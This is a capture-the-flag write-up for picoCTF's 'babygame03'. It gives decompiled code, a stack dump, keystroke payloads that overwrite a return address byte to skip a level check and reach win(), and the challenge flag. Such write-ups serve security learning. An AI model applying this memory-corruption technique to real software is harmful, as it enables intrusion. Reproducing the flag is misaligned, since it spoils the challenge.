
# babygame03

*Hard*

>### Description
>Break the game and get the flag.\
Welcome to BabyGame 03! Navigate around the map and see what you can find! Be careful, you don't have many moves. There are obstacles that instantly end the game on collision. The game is available to download [here](./game). There is no source available, so you'll have to figure your way around the map.
>You can connect with it using `nc rhea.picoctf.net 58452`.

### Solution

It looks like the same game as previous two challenges ([babygame01](../babygame01.md) and [babygame02](../babygame02/babygame02.md)), except now we have lives (50) and there is an obstackle (#) in the top left of the map. Each character that we input is one live lost. \
It also says we are in lvl 1, I dont know what this means.

Lets investigate the source code file. First run `checksec game`:

```
    Arch:       i386-32-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x8048000)
    Stripped:   No
```

Seems like it can be vulnerable, since it has no canary and no PIE. Now decompile the binary with **Ghidra** to look behind the scenes of what is happening. \
This is `main()`:

```c
undefined4 main(void)

{
  int iVar1;
  int local_ab4;
  int local_ab0;
  int local_aac;
  undefined local_aa1 [2700];
  char local_15;
  int local_14;
  undefined *local_10;
  
  local_10 = &stack0x00000004;
  init_player(&local_ab0);
  local_ab4 = 1;
  local_14 = 0;
  init_map(local_aa1,&local_ab0,&local_ab4);
  print_map(local_aa1,&local_ab0,&local_ab4);
  signal(2,sigint_handler);
  do {
    iVar1 = getchar();
    local_15 = (char)iVar1;
    move_player(&local_ab0,(int)local_15,local_aa1,&local_ab4);
    print_map(local_aa1,&local_ab0,&local_ab4);
    if (((local_ab0 == 0x1d) && (local_aac == 0x59)) && (local_ab4 != 4)) {
      puts("You win!\n Next level starting ");
      local_14 = local_14 + 1;
      local_ab4 = local_ab4 + 1;
      init_player(&local_ab0);
      init_map(local_aa1,&local_ab0,&local_ab4);
    }
  } while (((local_ab0 != 0x1d) || (local_aac != 0x59)) || ((local_ab4 != 5 || (local_14 != 4))));
  win(&local_ab4);
  return 0;
}
```

Notice that in order to get the flag (execute `win()`), you need to finish level 4 but it does not let you.

This is `move_player()`:

```c
void move_player(int *param_1,char param_2,int param_3,undefined4 param_4)

{
  int iVar1;
  
  if (param_1[2] < 1) {
    puts("No more lives left. Game over!");
    fflush(_stdout);
                    /* WARNING: Subroutine does not return */
    exit(0);
  }
  if (param_2 == 'l') {
    iVar1 = getchar();
    player_tile = (undefined)iVar1;
  }
  if (param_2 == 'p') {
    solve_round(param_3,param_1,param_4);
  }
  *(undefined *)(*param_1 * 0x5a + param_3 + param_1[1]) = 0x2e;
  if (param_2 == 'w') {
    *param_1 = *param_1 + -1;
  }
  else if (param_2 == 's') {
    *param_1 = *param_1 + 1;
  }
  else if (param_2 == 'a') {
    param_1[1] = param_1[1] + -1;
  }
  else if (param_2 == 'd') {
    param_1[1] = param_1[1] + 1;
  }
  if (*(char *)(*param_1 * 0x5a + param_3 + param_1[1]) == '#') {
    puts("You hit an obstacle!");
    fflush(_stdout);
                    /* WARNING: Subroutine does not return */
    exit(0);
  }
  *(undefined *)(*param_1 * 0x5a + param_3 + param_1[1]) = player_tile;
  param_1[2] = param_1[2] + -1;
  return;
}
```

Same as previous the challenges, we can write memory by changing our player_tile, and moving outside the bounderies of the map. 

Notice if we move to (0 -4) I get a bunch of lives. So we can move to (0 -4) without touching the obstackle (#), pressin 's' to go back into the real map, and press 'p' to finish the level and get to the next. Keep doing this. But we cannot really finish level 4, it does not give us the flag. This payload gives us a bunch of lives to play around in level 4, at location (0 86):

```
wwwaaaaaaaawsp
wwwaaaaaaaawsp
wwwaaaaaaaawsp
wwwaaaaaaaaws
```

We have to circumvent the if statement to check if the level is done, by overwriting the lsb of the return address while in the `move_player()` function. 

This is how the stack looks like, just before returning from move_player to main:
<pre>
0xffffc68c:     0x0804992c      0xffffc6b0      0xffffffff      0xffffc6bf
0xffffc69c:     0xffffc6ac      0xf7fbe480      0xffffd220      0x00000000
0xffffc6ac:     0x00000004      0x0000001d      0x00000059      0x00000018
0xffffc6bc:     0x2e000000      0x2e2e2e2e      0x2e2e2e2e      0x2e2e2e2e
0xffffc6cc:     0x2e2e2e2e      0x2e2e2e2e      0x2e2e2e2e      0x2e2e2e2e
0xffffc6dc:     0x2e2e2e2e      0x2e2e2e2e      0x2e2e2e2e      0x2e2e2e2e
</pre>

The offset from the start of the map to the lsb of the return address is 51 bytes. So move to (0 39) set player tile to 0x70 (inside the if statement), and press 'w'. This way we can get into level 5. 

Within the `win()` function it specifically checks if we are in level 5, so we shouldn't finish level 5 to get to level 6. Instead, we should overwrite the lsb of the return address of the move_player function again, but now just before the \<win\> function call, to 0x080499fe. Notice that in now we have an additional 16 bytes offset!

So [this](./payload) becomes our final payload.

Nice! On our local machine it works!

Now try on the remote server... 

<details>
<summary>Yes! We got the flag:</summary> 
picoCTF{gamer_leveluP_fb9b377c}
</details>